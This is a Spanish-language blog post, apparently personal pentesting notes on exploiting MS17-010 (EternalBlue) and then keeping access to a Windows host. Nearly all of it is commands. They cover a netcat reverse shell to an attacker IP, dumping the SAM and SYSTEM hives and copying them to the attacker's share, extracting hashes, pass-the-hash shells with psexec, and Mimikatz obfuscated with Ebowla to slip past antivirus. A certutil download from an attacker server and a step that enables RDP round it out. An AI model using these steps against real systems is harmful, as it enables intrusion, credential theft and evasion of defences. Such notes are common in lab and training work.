---
layout: single
title: "Apuntes MS17-010 EternalBlue"
date: 2024-10-23
categories: [tutoriales]
tags: [eternalblue, ms17-010, exploit, windows, seguridad]
excerpt: "Análisis detallado de la vulnerabilidad EternalBlue (MS17-010)"
permalink: /tutoriales/eternalblue-ms17-010/
header:
  image: "https://upload.wikimedia.org/wikipedia/commons/3/3f/Windows_XP_SP2_boot_screen.png"
  caption: "Windows XP SP2 boot screen — Wikimedia Commons"

---
# Escaneo y Persistencia con CrackMapExec y Mimikatz

## Escaneo con CrackMapExec

```bash
crackmapexec smb ip.victima
```

### Explotación de MS17

Para explotar manualmente MS17, hay que crear un recurso con `impacket-smb` que contenga `netcat.exe`. 

Ejemplo:

```bash
\ip.atacante\smbfolder
etcat.exe -e cmd 10.10.14.29 4444
```

Usando el exploit de zzz: viene con un checker que permite ver si es vulnerable a MS17 y listar los recursos. Si no muestra nada, usa `guest`.

Comando para compartir el recurso:

```bash
impacket-smb smbfolder $(pwd) --smb2support
```

Otra forma:

```bash
impacket-smb smbfolder=/tmp/recurso/que/quiero/compartir
```

**Poner en escucha con netcat en el puerto 4444**:

```bash
nc -lvnp 4444
```

---

## Persistencia

### 1. SAM

Crear una carpeta en `/tmp` y luego ejecutar:

```bash
reg save HKLM\system system.backup
reg save HKLM\sam sam.backup
```

Compartir archivos por red desde Windows después de crear copias de SAM y SYSTEM usando el recurso compartido:

```bash
impacket-smb smbfolder $(pwd) --smb2support
```

Copiar los archivos:

```bash
copy sam.backup \\IP\recursolinux\sam
copy system.backup \\IP\recursoLinux\system
```

Tener los archivos `sam` y `system` en Kali y ejecutar:

```bash
impacket-secretsdump -sam ruta/sam -system ruta/system LOCAL
```

Esto nos proporcionará los hashes para hacer **pass the hash** o crackearlos.

Ejemplo de uso con CrackMapExec para obtener secretos:

```bash
crackmapexec smb Ip-victima -u 'Administrator' -H 'hash' --lsa
```

### Para tener una shell:

```bash
impacket-psexec WORKGROUP/Administrator@Ip-victima -hashes :'hash'
```

---

### 2. Mimikatz

Ofuscar `Mimikatz` usando **Ebowla**.

Primero, clonar el repositorio:

```bash
git clone https://github.com/Genetic-Malware/Ebowla
```

Configuración de Ebowla:

```bash
output_type = GO
payload_type = EXE
```

Cambiar variables de entorno:

```bash
echo %computername%
echo %username%
echo %Number_of_processors%
```

Después de configurar el entorno de la víctima, ejecutar:

```bash
python2 ebowla.py mimikatz.exe generic_config
```

Esto crea el archivo `go_symetric_mimikatz.exe.go`. Para compilarlo:

```bash
./build_x64_go.sh go_symetric_mimikatz.exe.go archivo_legitimo.exe
```

Para pasar archivos de Linux a Windows:

```bash
python3 -m http.server 8080
```

En Windows, descargar el archivo:

```bash
certutils.exe -f -urlcache -split http://ip.linux/archivo_legitimo.exe
```

Luego, ejecutar el `Mimikatz` ofuscado y dumpear credenciales:

```bash
privilege::debug
sekurlsa::logonPasswords
```

---

### 3. RDP (Puerto 3389)

Para habilitar RDP, se necesita la contraseña de administrador. Ejecutar:

```bash
crackmapexec smb Ip-victima -u 'Administrator' -p 'password' -M rdp -o action=enable
```

RDP ya estará activo.
